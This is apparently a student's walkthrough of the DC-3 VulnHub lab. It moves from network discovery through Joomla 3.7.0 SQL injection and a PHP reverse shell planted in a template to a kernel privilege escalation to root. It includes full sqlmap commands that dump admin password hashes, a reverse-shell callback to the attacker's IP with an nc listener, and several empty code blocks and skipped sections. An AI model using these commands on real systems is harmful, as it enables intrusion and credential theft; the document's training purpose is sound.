# DC-3 VulnHub Walkthrough — From Enumeration to Root
**Date:** 17 September 2026  
> **Lab:** DC-3  
> **Target:** `192.168.29.174`  
> **Attacker:** Kali Linux  
> **Focus:** Enumeration → Joomla exploitation → SQL Injection → Credential discovery → Web-shell/reverse shell → Linux enumeration → Kernel privilege escalation → Root  
>
> This write-up documents what I actually did in the lab and, more importantly, **why each step led to the next one**. The goal is to understand the attack chain rather than simply copy commands.

---

## 1. What I Was Trying to Do

The overall objective was simple:

```text
Find the target
      ↓
Enumerate it
      ↓
Find an entry point
      ↓
Get access
      ↓
Enumerate from inside
      ↓
Escalate privileges
      ↓
Become root
      ↓
Read the flag
```

At the beginning I did not know that the final path would involve Joomla SQL injection and a Linux kernel privilege escalation.

The important lesson from DC-3 was that **each stage gave me information that pointed toward the next stage**.

---

# 2. Discovering the Target with Netdiscover

I started by discovering hosts on my lab network.

I used:

```bash
netdiscover
```

This allowed me to identify the DC-3 machine on the local network.

The target I worked with was:

```text
192.168.29.174
```

My Kali machine was using:

```text
192.168.29.163
```

So I had:

```text
Kali
192.168.29.163
        │
        │ lab network
        ▼
DC-3
192.168.29.174
```

### Why this mattered

Before scanning anything, I needed to know:

- Which host was the target?
- What IP address should I scan?
- What systems were present on the lab network?

This is the **discovery/enumeration phase**.

---

# 3. Initial Enumeration

Once I had the target IP, I started investigating what services were exposed.

The most important discovery was that the target was running a web application using **Joomla**.

I then used JoomScan:

```bash
joomscan -u http://192.168.29.174
```

JoomScan identified:

```text
Joomla version: 3.7.0
```

It also found the Joomla administrator area:

```text
/administrator/
```

and several Joomla directories.

### Why was the Joomla version important?

A software version is often a major clue.

Instead of randomly attacking the application, I could now ask:

> "Are there known vulnerabilities affecting Joomla 3.7.0?"

That led to SearchSploit.

---

# 4. Searching for Known Joomla Vulnerabilities

I searched the local Exploit-DB database:

```bash
searchsploit Joomla 3.7.0
```

One particularly interesting result was:

```text
Joomla! 3.7.0 - 'com_fields' SQL Injection
```

The vulnerability was associated with:

```text
CVE-2017-8917
```

### Why did I investigate this?

Because all three pieces matched:

```text
Target application → Joomla
Version             → 3.7.0
Known vulnerability → Joomla 3.7.0 SQL Injection
```

This gave me a possible route from a public web application to database access.

---

# 5. Inspecting the Exploit Information

I copied the Exploit-DB entry:

```bash
searchsploit -m php/webapps/42033.txt
```

Then inspected it:

```bash
cat ~/42033.txt
```

The exploit description identified the vulnerable parameter:


This was the clue that led me to test the `com_fields` endpoint.

The important endpoint structure was:

```text
/index.php?option=com_fields&view=fields&layout=modal
```

with the vulnerable parameter:

```text
list[fullordering]
```

---

# 6. Confirming SQL Injection with SQLmap

Instead of manually trying to extract database information, I used SQLmap against the vulnerable parameter:

```bash
sqlmap -u "http://192.168.29.174/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
--risk=3 --level=5 --random-agent --dbs \
-p "list[fullordering]"
```

SQLmap confirmed that:

```text
list[fullordering]
```

was injectable.

It also identified:

```text
DBMS: MySQL
```

and found databases including:

```text
information_schema
joomladb
mysql
performance_schema
sys
```

### Why was `joomladb` interesting?

Because Joomla itself was the application I was attacking.

So:

```text
Joomla
   ↓
SQL Injection
   ↓
MySQL
   ↓
joomladb
```

The application database was the obvious place to investigate next.

---

# 7. Enumerating the Joomla Database

I asked SQLmap to list the tables:

```bash
sqlmap -u "http://192.168.29.174/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
--risk=3 --level=5 --random-agent \
-D joomladb --tables \
-p "list[fullordering]"
```

It returned many tables.

One especially important table was:

```text
#__users
```

### Why was `#__users` interesting?

Joomla needs a user database.

A users table commonly contains information such as:

- username
- email
- password hash
- account information

So the investigation naturally moved from:

```text
joomladb
   ↓
#__users
```

---

# 8. Enumerating the Users Table

I asked SQLmap for the columns:

```bash
sqlmap -u "http://192.168.29.174/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
--risk=3 --level=5 --random-agent \
-D joomladb -T "#__users" --columns \
-p "list[fullordering]"
```

The important columns included:

```text
id
name
username
email
password
params
```

The `password` column was particularly important because Joomla stores password hashes rather than plaintext passwords.

---

# 9. Dumping the Administrator Password Hash

I extracted the relevant fields:

```bash
sqlmap -u "http://192.168.29.174/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
--risk=3 --level=5 --random-agent \
-D joomladb -T "#__users" \
-C "name,password" --dump \
-p "list[fullordering]"
```

This returned the Joomla administrator account and its password hash.

The hash had the form:

```text
$2y$10$...
```

That indicates a bcrypt-style password hash.

I then used a password-hash lookup/cracking resource in the lab and recovered the password.

### Important distinction

SQL injection did **not** directly give me the plaintext password.

The process was:

```text
SQL Injection
      ↓
Database access
      ↓
Password hash
      ↓
Password recovery
      ↓
Joomla administrator login
```

That distinction is important when explaining the attack in an interview.

Inside Joomla administrator, I investigated the template configuration.

The available templates included:

```text
Beez3

```

The important observation was that Joomla templates contain PHP files.

If I could modify a PHP template file and make the web server execute it, I could potentially turn Joomla administrator access into server-side code execution.

I used the Beez3 template and its:

```text

```

This gave me a path:

```text
Joomla Admin
     ↓
Modify PHP template
     ↓
PHP executes on server

Reverse shell
```

# 12. Preparing the PHP Reverse Shell

On Kali, I located the PHP reverse-shell example:

```bash
locate php-reverse-shell.php
```

One suitable copy was:

```text
/usr/share/webshells/php/php-reverse-shell.php
```

Because it was under a system directory, I needed elevated permissions to edit the file:

```bash

```

I configured it to connect back to my Kali machine:

```text
Kali IP: 192.168.29.163
Port:   8080
```

I then used the PHP reverse-shell code in the Joomla Beez3 `index.php`.

---

# 13. Starting the Listener

On Kali I started:

```bash
nc -lvnp 8080
```

This means:

```text
-l  → listen
-v  → verbose
-n  → don't resolve DNS
-p  → use port 8080
```

I then accessed the modified Joomla template.

The connection came back from:

```text
192.168.29.174
```

and I received a shell.

---

# 14. Initial Shell — `www-data`

The shell identified me as:

```bash
whoami
```

Result:

```text
www-data
```

This was expected.

Apache/PHP commonly executes web applications under a restricted service account. I had achieved **remote code execution**, but I was not root.

So the new objective became:

```text
www-data
   ↓
root
```

---

# 15. Stabilizing the Reverse Shell

The first reverse shell was not a proper terminal:

```text
/bin/sh: 0: can't access tty; job control turned off
```

I used Python to spawn Bash through a pseudo-terminal:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

This gave me a much more usable prompt:

```text
www-data@DC-3:/$
```

### Why do this?

A raw reverse shell can have problems with:

- terminal interaction
- job control
- commands requiring a TTY
- readability and usability

A PTY gives me a more interactive shell.

---

# 16. Trying `sudo`

I checked:

```bash
sudo -l
```

Initially, because the reverse shell didn't have a proper TTY, I got:

```text
sudo: no tty present and no askpass program specified
```

After stabilizing the shell, `sudo -l` asked for a password.

I did not have a confirmed Linux password for `www-data`, so I did not rely on sudo.

This was an important lesson:

> A password recovered from a web application's database does not automatically mean the same password works for a Linux system account.

---

# 19. Understanding the `double-fdput` Vulnerability

This was the most confusing part of the box for me.

The vulnerability involved Linux's BPF/eBPF functionality and incorrect reference handling involving file descriptors.

At a high level:

```text
BPF operation
     ↓
incorrect fd reference handling
     ↓
reference count becomes incorrect
     ↓
use-after-free condition
     ↓
attacker gets controlled reuse of freed memory
     ↓
privilege escalation
```

The exploit description explained that the technique could ultimately be used to modify a protected file such as `/etc/crontab`, allowing execution with root privileges.

I did not need to understand every line of the kernel internals to identify the vulnerability, but I needed to understand the overall idea:

> A vulnerable kernel bug can sometimes allow a low-privileged local user to perform an operation that should require root.

Instead of trying to make the exploit binaries on my modern Kali system work with the old target environment, I transferred the source archive to DC-3.

Then, from the DC-3 shell:


# 24. Running the Local Privilege Escalation

I ran:

```bash
./doubleput
```

The exploit first printed:

```text

```

Then:

```text

```

This was a significant indication that the exploit had reached the intended pointer-reuse condition.

It then said:

```text

```

At first I typed:

```bash

whoami
```

but the exploit simply echoed the input because the root shell had not been created yet.

I waited.

Then it printed:

```text

we have root privs now...
```

That was the successful privilege escalation.

# 27. Where the Hints Came From

One of the biggest things I needed to understand from this room was **where the next step came from**.

It was not one giant clue.

It was a sequence of smaller clues.

| Finding | What it suggested |
|---|---|
| Target discovered by `netdiscover` | Scan/investigate that IP |
| Joomla detected | Enumerate Joomla |
| Joomla 3.7.0 | Search for version-specific vulnerabilities |
| `com_fields` SQLi found | Test the vulnerable parameter |
| SQLmap confirms injection | Enumerate the database |
| `joomladb` found | Investigate Joomla's database |
| `#__users` found | Look for user credentials |
| Password hash obtained | Recover the lab credential |
| Joomla admin access | Look for ways to execute server-side code |
| PHP template files | Possible code execution |
| Reverse shell as `www-data` | Move from web exploitation to OS enumeration |
| Ubuntu 16.04 | Search OS-specific privilege escalation |
| Kernel 4.4.0-21 | Search kernel-version-specific exploits |
| `39772` found | Inspect the double-fdput vulnerability |
| Exploit description + matching kernel | Obtain and test the local exploit |
| `uid=0(root)` | Privilege escalation confirmed |
| `/root/the-flag.txt` | Final objective |

This is the most important thing I learned from DC-3:

> **Enumeration creates clues. Those clues determine what to investigate next.**

# 29. What I Should Remember for Future Labs

## Rule 1 — Always fingerprint first

Record:

```text
IP
Open ports
Services
Versions
Operating system
Kernel
Architecture
Current user
```

These details become clues later.

## Rule 2 — Search version-specific vulnerabilities

If I discover:

```text
Joomla 3.7.0
```

I can search:

```bash
searchsploit Joomla 3.7.0
```

If I discover:

```text
Ubuntu 16.04
Kernel 4.4.0-21
```

I can search:

```bash
searchsploit "Ubuntu 16.04"
searchsploit "4.4.0-21"
```

## Rule 3 — Separate initial access from privilege escalation

Getting:

```text
www-data
```

does not mean the machine is compromised as root.

The chain was:

```text
Initial access
    ↓
www-data
    ↓
Local enumeration
    ↓
Privilege escalation
    ↓
root
```

## Rule 4 — Verify every important step

Don't assume.

For example:

```bash
whoami
id
```

proved who I was.

Similarly, SQLmap confirmed the SQL injection rather than me assuming the parameter was vulnerable.

## Rule 5 — Read exploit descriptions

SearchSploit gives candidates, not guarantees.

The correct process is:

```text
Find candidate
     ↓
Read description
     ↓
Compare requirements with target
     ↓
Understand what it does
     ↓
Use it in the lab
     ↓
Verify result
```

# 30. Final DC-3 Lessons

DC-3 was difficult for me because it was not a single-topic room.

The machine forced me to connect multiple concepts:

- Network discovery
- Web enumeration
- Joomla
- CVE research
- SQL injection
- SQLmap
- MySQL
- Password hashes
- Joomla administration
- PHP
- Reverse shells
- Linux permissions
- OS/kernel enumeration
- SearchSploit
- Local privilege escalation
- Root verification

The biggest lesson was not the individual exploit.

It was learning to think:

```text
"What did I just discover?"
             ↓
"What does that tell me?"
             ↓
"What can I investigate because of it?"
             ↓
"What evidence do I need before moving on?"
```

That is the methodology I want to carry into future CTFs, penetration-testing labs, and cybersecurity work.
